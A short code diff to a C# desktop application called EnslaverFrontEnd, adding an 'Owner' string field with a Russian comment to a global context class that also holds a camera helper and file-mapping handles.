@@ -11,6 +11,9 @@ namespace EnslaverFrontEnd.Logic
 {
     public class AppGlobalContext : FormFactory
     {
+        //Здесь будет хранится  тот, чей компьютер
+        public string Owner = "";
+
         public static IntPtr FileMapHandler = IntPtr.Zero, HandlerOfMapView = IntPtr.Zero;
 
         public CamHelper CamHelper = new CamHelper();
@@ -36,6 +39,7 @@ namespace EnslaverFrontEnd.Logic
         private static FormFactory _formFactory = null;
 
         public bool AllowExit = false;
+
 
         public AppGlobalContext()
         {
